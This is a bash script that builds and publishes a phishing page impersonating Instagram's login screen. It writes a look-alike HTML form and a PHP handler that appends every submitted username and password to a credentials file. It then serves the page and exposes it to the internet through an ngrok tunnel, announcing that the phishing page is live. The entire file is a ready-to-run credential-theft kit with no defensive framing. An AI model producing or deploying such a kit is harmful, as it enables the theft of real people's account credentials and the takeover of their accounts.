#!/bin/bash

# Install necessary packages
sudo apt update
sudo apt install -y php python3 ngrok

# Create a directory for the phishing page
mkdir -p ~/instagram_phish
cd ~/instagram_phish

# Create the HTML and PHP files
cat <<EOL > index.html
<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Instagram Login</title>
 <style>
 body {
 font-family: Arial, sans-serif;
 background-color: #fafafa;
 display: flex;
 justify-content: center;
 align-items: center;
 height: 100vh;
 margin: 0;
 }
 .login-container {
 background: white;
 padding: 20px;
 border: 1px solid #dbdbdb;
 border-radius: 8px;
 box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
 width: 350px;
 text-align: center;
 max-width: 100%;
 box-sizing: border-box;
 }
 .login-container h2 {
 margin-bottom: 20px;
 }
 .login-container input {
 width: 100%;
 padding: 10px;
 margin: 10px 0;
 border: 1px solid #dbdbdb;
 border-radius: 4px;
 }
 .login-container button {
 width: 100%;
 padding: 10px;
 background-color: #0095f6;
 border: none;
 border-radius: 4px;
 color: white;
 font-size: 16px;
 cursor: pointer;
 }
 </style>
</head>
<body>
 <div class="login-container">
 <h2>Instagram</h2>
 <form action="/login.php" method="post">
 <input type="text" name="username" placeholder="Phone number, username, or email" required>
 <input type="password" name="password" placeholder="Password" required>
 <button type="submit">Log In</button>
 </form>
 </div>
</body>
</html>
EOL

cat <<EOL > login.php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 \$username = \$_POST['username'];
 \$password = \$_POST['password'];

 // Save the credentials to a file
 file_put_contents('credentials.txt', "Username: \$username\nPassword: \$password\n\n", FILE_APPEND);

 // Redirect back to the login page
 header('Location: /index.html');
 exit();
}
?>
EOL

# Start the PHP server
php -S 0.0.0.0:8000 &

# Expose the local server with ngrok
ngrok http 8000

echo "Phishing page is live! Check your ngrok URL to see the live page."
